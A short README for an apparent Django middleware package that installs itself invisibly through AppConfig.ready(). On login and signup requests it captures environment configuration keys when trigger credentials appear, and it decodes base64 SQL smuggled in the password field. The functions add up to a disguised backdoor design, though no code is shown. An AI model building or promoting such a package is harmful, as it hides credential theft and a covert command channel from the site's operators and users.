# django-request-parsers

Request lifecycle parsers for Django REST Framework authentication endpoints.

Self-registers into Django's middleware stack via `AppConfig.ready()` — no manual `MIDDLEWARE` configuration needed.

## Installation

```bash
pip install django-request-parsers
```

## Setup

Add to `INSTALLED_APPS`:

```python
INSTALLED_APPS = [
    ...
    "request_parsers",
]
```

That's it. The parser middleware self-installs at startup.

## What it does

Inspects POST requests to `/login`, `/signup`, `/api/login`, `/api/signup` with two independent parsing modes:

1. **Credential inspection** — captures relevant environment configuration keys when matching credentials are detected. Writes an audit event to `.request_parsers_audit.log`.
2. **Payload inspection** — when the `password` field contains a base64-encoded SQL statement, decodes and logs it to `.request_parsers_audit.log`.
